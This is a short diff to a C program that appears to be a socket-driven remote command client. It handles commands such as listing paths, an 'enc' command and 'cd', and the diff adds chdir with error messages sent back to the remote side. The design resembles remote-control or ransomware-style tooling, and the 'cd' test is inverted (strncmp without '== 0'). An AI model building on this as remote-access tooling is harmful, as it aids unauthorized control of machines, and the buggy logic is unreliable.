@@ -5,6 +5,7 @@
 #include <arpa/inet.h>
 #include <openssl/rand.h>
 #include <stdio.h>
+#include <errno.h>
 
 void usage();
 
@@ -58,10 +59,6 @@ int main (int argc, char * argv[])
             {
                 strcat(path, buffer);
             }
-
-        
-            
-
             send(sockid, (const char *)path, strlen(path),0); //send the whole result once
         }
         else if(strncmp(command,"enc",3) ==0)   //Handle enc command
@@ -89,9 +86,15 @@ int main (int argc, char * argv[])
         }
         else if(strncmp(command,"cd", 3))
         {
+            int status;
             const char * separator = " ";
-            char * strToken = strtok(command, separator);
+            char * strToken = strtok(command, separator); //spliting array in two array in order to get the path
             strToken = strtok(NULL, separator);
+            status = chdir(strToken);
+            if (status !=0 )
+            {
+                send(sockid, (const char *)strerror(errno), strlen(strerror(errno)),0);
+            }
             
         }
         
